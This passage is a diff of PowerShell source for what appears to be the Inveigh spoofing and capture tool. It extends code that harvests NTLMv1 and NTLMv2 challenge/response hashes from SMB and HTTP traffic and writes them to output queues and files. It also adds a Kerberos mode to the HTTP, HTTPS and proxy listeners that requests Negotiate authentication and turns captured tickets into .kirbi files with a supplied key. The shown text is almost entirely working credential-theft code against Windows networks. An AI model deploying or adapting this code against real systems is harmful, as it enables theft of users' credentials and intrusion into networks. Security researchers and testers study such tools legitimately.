+                    if($inveigh.IP_capture_list -notcontains $source_IP -and -not $NTLM_user_string.EndsWith('$') -and !$inveigh.spoofer_repeat -and $source_IP -ne $IP)
+                    {
+                        $inveigh.IP_capture_list.Add($source_IP.IPAddressToString) > $null
+                    }
+
+                }
+
+            }
+            elseif($NTLM_length -eq 24)
+            {
+                $NTLMv1_hash = $NTLM_user_string + "::" + $NTLM_domain_string + ":" + $LM_response + ":" + $NTLM_response + ":" + $NTLM_challenge
+
+                if($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $NTLM_user_string.EndsWith('$')))
+                {
+                    $inveigh.NTLMv1_list.Add($NTLMv1_hash) > $null
+
+                    if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv1_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string"))
+                    {
+                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv1 challenge/response captured from $source_IP`:$source_port($NTLM_host_string)`:`n$NTLMv1_hash") > $null
+                    }
+                    else
+                    {
+                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv1 challenge/response captured from $source_IP`:$source_port($NTLM_host_string)`:`n$NTLM_domain_string\$NTLM_user_string [not unique]") > $null
+                    }
+
+                    if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv1_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")))
+                    {
+                        $inveigh.NTLMv1_file_queue.Add($NTLMv1_hash) > $null
+                        $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] SMB($Port) NTLMv1 challenge/response written to " + $inveigh.NTLMv1_out_file) > $null
+                    }
+
+                    if($inveigh.NTLMv1_username_list -notcontains "$source_IP $NTLM_domain_string\$NTLM_user_string")
+                    {
+                        $inveigh.NTLMv1_username_list.Add("$source_IP $NTLM_domain_string\$NTLM_user_string") > $null
+                    }
+
+                    if($inveigh.IP_capture_list -notcontains $source_IP -and -not $NTLM_user_string.EndsWith('$') -and !$inveigh.spoofer_repeat -and $source_IP -ne $IP)
+                    {
+                        $inveigh.IP_capture_list.Add($source_IP.IPAddressToString) > $null
+                    }
+
+                }
+
+            }
+            elseif($NTLM_length -eq 0)
+            {
+                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLM null response from $source_IP`:$source_port($NTLM_host_string)") > $null
+            }
+
+            Invoke-SessionUpdate $NTLM_domain_string $NTLM_user_string $NTLM_host_string $source_IP
         }
 
     }
@@ -3303,8 +3315,10 @@ $SMB_NTLM_functions_scriptblock =
 # HTTP Server ScriptBlock - HTTP/HTTPS/Proxy listener
 $HTTP_scriptblock =
 {
-    param ($Challenge,$HTTPAuth,$HTTPBasicRealm,$HTTPContentType,$HTTPIP,$HTTPPort,$HTTPDefaultEXE,$HTTPDefaultFile,$HTTPDir,$HTTPResponse,
-    $HTTPS_listener,$NBNSBruteForcePause,$Proxy,$ProxyIgnore,$proxy_listener,$WPADAuth,$WPADAuthIgnore,$WPADResponse)
+    param ($Challenge,$Kerberos,$KerberosCount,$KerberosCredential,$KerberosHash,$KerberosHostHeader,$HTTPAuth,
+    $HTTPBasicRealm,$HTTPContentType,$HTTPIP,$HTTPPort,$HTTPDefaultEXE,$HTTPDefaultFile,$HTTPDir,$HTTPResponse,
+    $HTTPS_listener,$NBNSBruteForcePause,$output_directory,$Proxy,$ProxyIgnore,$proxy_listener,$WPADAuth,
+    $WPADAuthIgnore,$WPADResponse)
 
     function Get-NTLMChallengeBase64
     {
@@ -3428,11 +3442,26 @@ $HTTP_scriptblock =
         $HTTP_running = $false
         $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] Error starting $HTTP_type listener") > $null
     }
+
+    if($Kerberos -eq 'Y')
+    {
+
+        if($KerberosHash)
+        {
+            $kerberos_base_key = (&{for ($i = 0;$i -lt $KerberosHash.Length;$i += 2){$KerberosHash.SubString($i,2)}}) -join "-"
+            $kerberos_base_key = $kerberos_base_key.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+        }
+        elseif($KerberosCredential)
+        {
+            $kerberos_base_key = Get-KerberosAES256BaseKey ($KerberosCredential.UserName).Trim("\") $KerberosCredential.Password
+        }
+
+    }
     
     :HTTP_listener_loop while($inveigh.running -and $HTTP_running)
     {
         $TCP_request = $null
-        $TCP_request_bytes = New-Object System.Byte[] 4096
+        $TCP_request_bytes = New-Object System.Byte[] 8192
         $HTTP_send = $true
         $HTTP_header_content_type = [System.Text.Encoding]::UTF8.GetBytes("Content-Type: text/html")
         $HTTP_header_cache_control = $null
@@ -3485,24 +3514,26 @@ $HTTP_scriptblock =
             if(!$HTTP_client.Connected -or $HTTP_client_close -and $inveigh.running)
             {
                 $HTTP_client = $HTTP_listener.AcceptTcpClient() 
-	            $HTTP_stream = $HTTP_client.GetStream()
+                $HTTP_stream = $HTTP_client.GetStream()
             }
 
             if($HTTP_stream.DataAvailable)
             {
                 $HTTP_data_available = $true
+
+                do
+                {
+                    $HTTP_stream.Read($TCP_request_bytes,0,$TCP_request_bytes.Length) > $null
+                }until(!$HTTP_stream.DataAvailable)
+
             }
             else
             {
                 $HTTP_data_available = $false
             }
 
-            while($HTTP_stream.DataAvailable)
-            {
-                $HTTP_stream.Read($TCP_request_bytes,0,$TCP_request_bytes.Length) > $null
-            }
-
             $TCP_request = [System.BitConverter]::ToString($TCP_request_bytes)
+            $inveigh.blah += $TCP_request
         }
 
         if($TCP_request -like "47-45-54-20*" -or $TCP_request -like "48-45-41-44-20*" -or $TCP_request -like "4f-50-54-49-4f-4e-53-20*" -or $TCP_request -like "43-4f-4e-4e-45-43-54*" -or $TCP_request -like "50-4f-53-54*")
@@ -3607,7 +3638,7 @@ $HTTP_scriptblock =
 
                 $HTTP_POST_request_old = $HTTP_POST_request
             }
-
+            
             if($HTTP_header_authorization.StartsWith('NTLM '))
             {
                 $HTTP_header_authorization = $HTTP_header_authorization -replace 'NTLM ',''
@@ -3690,11 +3721,11 @@ $HTTP_scriptblock =
 
                             if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_username_full"))
                             {
-                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLMv2 challenge/response captured from $HTTP_source_IP($HTTP_NTLM_host_string)`:$HTTP_source_port`:`n$HTTP_NTLM_hash") > $null
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLMv2 challenge/response captured from $HTTP_source_IP`:$HTTP_source_port($HTTP_NTLM_host_string)`:`n$HTTP_NTLM_hash") > $null
                             }
                             else
                             {
-                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLMv2 challenge/response captured from $HTTP_source_IP($HTTP_NTLM_host_string)`:$HTTP_source_port`:`n$HTTP_username_full [not unique]") > $null
+                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLMv2 challenge/response captured from $HTTP_source_IP`:$HTTP_source_port($HTTP_NTLM_host_string)`:`n$HTTP_username_full [not unique]") > $null
                             }
 
                             if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")))
@@ -3748,7 +3779,31 @@ $HTTP_scriptblock =
                 }
 
             }
-            elseif($HTTP_header_authorization.startswith('Basic '))
+            elseif($HTTP_header_authorization.StartsWith('Negotiate '))
+            {
+                $HTTP_response_status_code = 0x32,0x30,0x30
+                $HTTP_response_phrase = 0x4f,0x4b
+                $HTTP_client_close = $true
+                $HTTP_header_authorization = $HTTP_header_authorization -replace 'Negotiate ',''
+                [Byte[]]$HTTP_request_bytes = [System.Convert]::FromBase64String($HTTP_header_authorization)
+                $HTTP_request_converted = [System.BitConverter]::ToString($HTTP_request_bytes)
+                $HTTP_request_converted = $HTTP_request_converted -replace "-",""
+                $HTTP_index = $HTTP_request_converted.IndexOf("2A864886F7120102020100")
+
+                if($HTTP_index -gt 0)
+                {
+                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) authentication method is Kerberos for $HTTP_source_IP`:$HTTP_source_port") > $null
+
+                    if($Kerberos -eq 'Y')
+                    {
+                        $HTTP_connection_header_close = $false
+                        New-KerberosKirbi $HTTP_request_bytes $kerberos_base_key $HTTP_type $HTTPPort "$HTTP_source_IP`:$HTTP_source_port"
+                    }
+
+                }
+                
+            }
+            elseif($HTTP_header_authorization.Startswith('Basic '))
             {
                 $HTTP_response_status_code = 0x32,0x30,0x30
                 $HTTP_response_phrase = 0x4f,0x4b
@@ -3839,7 +3894,16 @@ $HTTP_scriptblock =
 
             if(($HTTPAuth -like 'NTLM*' -and $HTTP_request_raw_URL -notmatch '/wpad.dat') -or ($WPADAuth -like 'NTLM*' -and $HTTP_request_raw_URL -match '/wpad.dat') -and !$HTTP_client_close)
             {
-                $HTTP_header_authenticate_data = [System.Text.Encoding]::UTF8.GetBytes($NTLM)
+
+                if($Kerberos -eq 'Y' -and ($KerberosHostHeader.Count -gt 0 -and $KerberosHostHeader -contains $HTTP_header_host))
+                {
+                    $HTTP_header_authenticate_data = [System.Text.Encoding]::UTF8.GetBytes("Negotiate")
+                }
+                else
+                {
+                    $HTTP_header_authenticate_data = [System.Text.Encoding]::UTF8.GetBytes($NTLM)
+                }
+                
             }
             elseif(($HTTPAuth -eq 'Basic' -and $HTTP_request_raw_URL -notmatch '/wpad.dat') -or ($WPADAuth -eq 'Basic' -and $HTTP_request_raw_URL -match '/wpad.dat'))
             {
@@ -3967,7 +4031,7 @@ $sniffer_scriptblock =
         if($KerberosHash)
         {
             $kerberos_base_key = (&{for ($i = 0;$i -lt $KerberosHash.Length;$i += 2){$KerberosHash.SubString($i,2)}}) -join "-"
-            $kerberos_base_key = $inveigh.kerberos_base_key.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+            $kerberos_base_key = $kerberos_base_key.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
         }
         elseif($KerberosCredential)
         {
@@ -4094,15 +4158,15 @@ $sniffer_scriptblock =
                         if($SMB -eq 'Y')
                         {
 
-                            if($inveigh.kerberos_packet_list[$inveigh.kerberos_index].Count -lt $kerberos_length -and "$source_IP`:$source_port" -eq $kerberos_source)
+                            if($kerberos_data.Count -lt $kerberos_length -and "$source_IP`:$source_port" -eq $kerberos_source)
                             {
-                                $inveigh.kerberos_packet_list[$inveigh.kerberos_index] += $payload_bytes
+                                $kerberos_data += $payload_bytes
 
-                                if($inveigh.kerberos_packet_list[$inveigh.kerberos_index].Count -ge $kerberos_length)
+                                if($kerberos_data.Count -ge $kerberos_length)
                                 {
-                                    New-KerberosKirbi $kerberos_base_key 445
-                                    $inveigh.kerberos_index = $inveigh.kerberos_packet_list.Count
+                                    New-KerberosKirbi $kerberos_data $kerberos_base_key "SMB" 445 "$source_IP`:$source_port"
                                     $kerberos_length = $null
+                                    $kerberos_data = $null
                                     $kerberos_source = $null
                                 }
 
@@ -4110,7 +4174,9 @@ $sniffer_scriptblock =
 
                             if($payload_bytes)
                             {   
-                                $kerberos_length = Get-SMBConnection $payload_bytes $source_IP $source_port "445"
+                                $kerberos_connection = Get-SMBConnection $payload_bytes $source_IP $source_port "445"
+                                $kerberos_length = $kerberos_connection[0]
+                                $kerberos_data = $kerberos_connection[1]
                                 $kerberos_source = "$source_IP`:$source_port"
                             }
 
@@ -5473,12 +5539,15 @@ function HTTPListener
     $HTTP_powershell = [PowerShell]::Create()
     $HTTP_powershell.Runspace = $HTTP_runspace
     $HTTP_powershell.AddScript($shared_basic_functions_scriptblock) > $null
-    $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($HTTPAuth).AddArgument(
-        $HTTPBasicRealm).AddArgument($HTTPContentType).AddArgument($HTTPIP).AddArgument($HTTPPort).AddArgument(
+    $HTTP_powershell.AddScript($kerberos_functions_scriptblock) > $null
+    $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($Kerberos).AddArgument(
+        $KerberosCount).AddArgument($KerberosCredential).AddArgument($KerberosHash).AddArgument(
+        $KerberosHostHeader).AddArgument($HTTPAuth).AddArgument($HTTPBasicRealm).AddArgument(
+        $HTTPContentType).AddArgument($HTTPIP).AddArgument($HTTPPort).AddArgument(
         $HTTPDefaultEXE).AddArgument($HTTPDefaultFile).AddArgument($HTTPDir).AddArgument(
         $HTTPResponse).AddArgument($HTTPS_listener).AddArgument($NBNSBruteForcePause).AddArgument(
-        $Proxy).AddArgument($ProxyIgnore).AddArgument($proxy_listener).AddArgument($WPADAuth).AddArgument(
-        $WPADAuthIgnore).AddArgument($WPADResponse) > $null
+        $output_directory).AddArgument($Proxy).AddArgument($ProxyIgnore).AddArgument($proxy_listener).AddArgument(
+        $WPADAuth).AddArgument($WPADAuthIgnore).AddArgument($WPADResponse) > $null
     $HTTP_powershell.BeginInvoke() > $null
 }
 
@@ -5495,12 +5564,15 @@ function HTTPSListener
     $HTTPS_powershell = [PowerShell]::Create()
     $HTTPS_powershell.Runspace = $HTTPS_runspace
     $HTTPS_powershell.AddScript($shared_basic_functions_scriptblock) > $null
-    $HTTPS_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($HTTPAuth).AddArgument(
-        $HTTPBasicRealm).AddArgument($HTTPContentType).AddArgument($HTTPIP).AddArgument($HTTPSPort).AddArgument(
+    $HTTPS_powershell.AddScript($kerberos_functions_scriptblock) > $null
+    $HTTPS_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($Kerberos).AddArgument(
+        $KerberosCount).AddArgument($KerberosCredential).AddArgument($KerberosHash).AddArgument(
+        $KerberosHostHeader).AddArgument($HTTPAuth).AddArgument($HTTPBasicRealm).AddArgument(
+        $HTTPContentType).AddArgument($HTTPSIP).AddArgument($HTTPSPort).AddArgument(
         $HTTPDefaultEXE).AddArgument($HTTPDefaultFile).AddArgument($HTTPDir).AddArgument(
         $HTTPResponse).AddArgument($HTTPS_listener).AddArgument($NBNSBruteForcePause).AddArgument(
-        $Proxy).AddArgument($ProxyIgnore).AddArgument($proxy_listener).AddArgument($WPADAuth).AddArgument(
-        $WPADAuthIgnore).AddArgument($WPADResponse) > $null
+        $output_directory).AddArgument($Proxy).AddArgument($ProxyIgnore).AddArgument($proxy_listener).AddArgument(
+        $WPADAuth).AddArgument($WPADAuthIgnore).AddArgument($WPADResponse) > $null
     $HTTPS_powershell.BeginInvoke() > $null
 }
 
@@ -5517,12 +5589,15 @@ function ProxyListener
     $proxy_powershell = [PowerShell]::Create()
     $proxy_powershell.Runspace = $proxy_runspace
     $proxy_powershell.AddScript($shared_basic_functions_scriptblock) > $null
-    $proxy_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($HTTPAuth).AddArgument(
-        $HTTPBasicRealm).AddArgument($HTTPContentType).AddArgument($ProxyIP).AddArgument($ProxyPort).AddArgument(
+    $proxy_powershell.AddScript($kerberos_functions_scriptblock) > $null
+    $proxy_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($Kerberos).AddArgument(
+        $KerberosCount).AddArgument($KerberosCredential).AddArgument($KerberosHash).AddArgument(
+        $KerberosHostHeader).AddArgument($HTTPAuth).AddArgument($HTTPBasicRealm).AddArgument(
+        $HTTPContentType).AddArgument($ProxyIP).AddArgument($ProxyPort).AddArgument(
         $HTTPDefaultEXE).AddArgument($HTTPDefaultFile).AddArgument($HTTPDir).AddArgument(
         $HTTPResponse).AddArgument($HTTPS_listener).AddArgument($NBNSBruteForcePause).AddArgument(
-        $Proxy).AddArgument($ProxyIgnore).AddArgument($proxy_listener).AddArgument($WPADAuth).AddArgument(
-        $WPADAuthIgnore).AddArgument($WPADResponse) > $null
+        $output_directory).AddArgument($Proxy).AddArgument($ProxyIgnore).AddArgument($proxy_listener).AddArgument(
+        $WPADAuth).AddArgument($WPADAuthIgnore).AddArgument($WPADResponse) > $null
     $proxy_powershell.BeginInvoke() > $null
 }
 
@@ -5535,6 +5610,7 @@ function SnifferSpoofer
     $sniffer_powershell = [PowerShell]::Create()
     $sniffer_powershell.Runspace = $sniffer_runspace
     $sniffer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
+    $sniffer_powershell.AddScript($kerberos_functions_scriptblock) > $null
     $sniffer_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
     $sniffer_powershell.AddScript($sniffer_scriptblock).AddArgument($EvadeRG).AddArgument($IP).AddArgument(
         $Kerberos).AddArgument($KerberosCount).AddArgument($KerberosCredential).AddArgument(
